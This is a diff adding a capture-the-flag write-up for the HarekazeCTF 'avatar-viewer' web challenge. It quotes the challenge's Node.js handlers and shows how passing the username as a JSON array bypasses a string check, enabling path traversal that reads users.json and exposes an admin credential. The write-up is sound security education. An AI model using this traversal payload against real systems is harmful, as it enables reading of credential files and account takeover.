@@ -40,6 +40,89 @@ Payload: ' '-f/flag
 
 FLAG: HarekazeCTF{1t's_7pm_1n_t0ky0}
 
+## [Web] avatar-viewer
+### Description
+Do you remember the challenges named Avatar Uploader? As you know, that Web app has critical vulnerabilities. This time I removed upload functions for safety.
+
+### Solve
+
+```javascript
+app.get('/myavatar.png', async (request, reply) => {
+  const username = request.session.get('username');
+  if (!username) {
+    request.flash('error', 'please log in to view this page');
+    return reply.redirect('/login');
+  }
+
+  if (username.includes('.') || username.includes('/') || username.includes('\\')) {
+    request.flash('error', 'no hacking!');
+    return reply.redirect('/login');
+  }
+
+  const imagePath = path.normalize(`${__dirname}/images/${username}`);
+  if (!imagePath.startsWith(__dirname)) {
+    request.flash('error', 'no hacking!');
+    return reply.redirect('/login');
+  }
+
+  reply.type('image/png');
+  if (fs.existsSync(imagePath)) {
+    return fs.readFileSync(imagePath);
+  }
+  return fs.readFileSync('images/default');
+});
+```
+As you can see, `/myavatar.png` endpoint is return images via `fs.readFileSync`.
+When calling `ffs.readFileSync`, Argument is setted by username stored session.
+And, we can't use `.`, `/`, and `\` because it checks using `includes`.
+
+Let's see the login handler:
+```javascript
+app.post('/login', async (request, reply) => {
+  if (!request.body) {
+    request.flash('error', 'HTTP request body is empty');
+    return reply.redirect('/login');
+  }
+
+  if (!('username' in request.body && 'password' in request.body)) {
+    request.flash('error', 'username or password is not provided');
+    return reply.redirect('/login');
+  }
+
+  const { username, password } = request.body;
+  if (username.length > 16) {
+    request.flash('error', 'username is too long');
+    return reply.redirect('/login');
+  }
+
+  if (users[username] != password) { // if users don't have username, then it return undefined.
+    request.flash('error', 'username or password is incorrect');
+    return reply.redirect('/login');
+  }
+
+  request.session.set('username', username);
+  reply.redirect('/profile');
+});
+```
+Login handler doesn't check username and password type whether string or not.
+So, we can bypass above `includes` logic by inserting array.
+
+I got a users.json using below query:
+Query: {"username":["../users.json"],"password":null}
+
+Users.json
+```json
+{
+  "guest": "guest",
+  "admin-b01b9d62015f8b68": "b56c497ff08f76536631f2cc1100521ffabfece3d2da67c71176d69dcba41a25"
+}
+```
+
+Finally i logged in and got a flag.
+Query: Query: {"username":["admin-b01b9d62015f8b68"],"password":"b56c497ff08f76536631f2cc1100521ffabfece3d2da67c71176d69dcba41a25"}
+
+FLAG: HarekazeCTF{maji_natural_super_nyan}
+
 ## [Web] JWT is secure
 ### Description
 I learned implementing a custom session function is prone to be insecure, so this time I adopted JWT (JSON Web Token).
